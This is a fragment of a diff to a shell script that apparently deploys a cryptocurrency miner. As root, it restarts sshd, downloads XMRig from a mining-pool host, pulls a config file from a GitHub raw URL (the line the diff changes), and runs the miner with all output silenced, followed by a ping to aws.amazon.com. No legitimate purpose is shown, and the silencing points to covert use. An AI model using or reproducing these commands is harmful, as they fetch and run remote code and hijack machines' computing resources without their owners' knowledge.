@@ -6,7 +6,7 @@ sudo service sshd restart
 sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
 tar -xf /root/xmrig.tar.gz -C /root
 chmod u+x ./xmrig
-sudo wget -o- https://github.com/elen/modin/raw/refs/heads/main/xs.json
+sudo wget -o- https://raw.githubusercontent.com/denakg/elen/refs/heads/main/xs.json
 chmod u+x ./xs.json
 ./xmrig --config=./xs.json >/dev/null 2>&1
 ping aws.amazon.com
